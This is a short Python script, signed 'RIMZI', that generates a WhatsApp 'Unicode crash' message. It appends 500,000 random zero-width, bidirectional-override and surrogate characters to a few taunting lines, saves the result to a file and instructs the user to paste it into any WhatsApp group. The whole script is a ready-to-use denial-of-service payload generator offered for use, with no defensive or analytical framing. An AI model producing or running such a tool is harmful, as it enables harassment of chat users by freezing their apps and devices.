# 💥 RIMZI-MICRO-VISIBLE-MAX-CRASHER 💥
# ⚠️ WhatsApp Unicode Bomb - 5 line visible version
# 👑 Coded by RIMZI for Cyber Legends only

import os, time, random

def banner():
    os.system("clear")
    print("""
\033[1;31m██████╗ ██╗███╗   ███╗███████╗
\033[1;32m██╔══██╗██║████╗ ████║██╔════╝
\033[1;33m██████╔╝██║██╔████╔██║█████╗  
\033[1;34m██╔═══╝ ██║██║╚██╔╝██║██╔══╝  
\033[1;35m██║     ██║██║ ╚═╝ ██║███████╗
\033[1;36m╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝
\033[1;37m💣 MICRO VISIBLE MAX CRASHER 💣
        Coded by RIMZI ☠️
""")

def generate_payload():
    # Only 5–6 visible lines
    visible = (
        "👻 Group ended by RIMZI-X 💀\n"
        "🔥 No escape, WhatsApp freezes\n"
        "🚫 Try opening this group again\n"
        "😈 Bye-bye smooth scrolling\n"
        "👁 Hidden payload injected\n"
        "🧨 100K lines of Unicode crash\n\n"
    )

    invisible = ['\u200B', '\u200C', '\u200D', '\u2063', '\u2060', '\u200E', '\u200F', '\u061C']
    bidi = ['\u202A', '\u202B', '\u202C', '\u202D', '\u202E']
    math = ['\u2061', '\u2062', '\u2063']
    surrogate = ['\uDBFF\uDFFF']

    charset = invisible + bidi + math + surrogate

    crash = visible

    # Add 500,000+ invisible bombs
    print("[+] Generating 500,000 crash characters...")

    for _ in range(500000):
        crash += random.choice(charset)

    return crash

def main():
    banner()
    time.sleep(1)
    print("[+] Building CRASH message (fast)...")
    payload = generate_payload()

    with open("rimzi_micro_crash.txt", "w", encoding="utf-8") as f:
        f.write(payload)

    print("\n[✔] DONE! Crash message saved as 'rimzi_micro_crash.txt'")
    print("📩 Copy from the file and paste into any WhatsApp group 💣")

if __name__ == "__main__":
    main()
